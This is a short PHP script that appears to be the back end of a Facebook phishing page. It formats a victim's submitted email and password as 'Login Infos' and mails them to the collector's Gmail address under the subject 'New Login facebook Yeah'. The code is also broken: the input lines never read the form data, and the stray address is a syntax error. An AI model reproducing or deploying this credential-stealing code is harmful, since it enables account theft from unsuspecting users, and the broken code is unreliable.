<?php

$email['email']; 
$pass['pass'];
$message .= "|----------+| Login Infos |+--------------|\n"; 
$message .= "|Email    : ".$email."\n";
$message .= "|PassWord : ".$pass."\n";
$message .= "|----------------| End |------------------|\n";                                     
$subject = "New Login facebook Yeah ";
$send = "your email here"; hmedhosny55@gmail.com
mail("$send", "$subject", $message);   
?>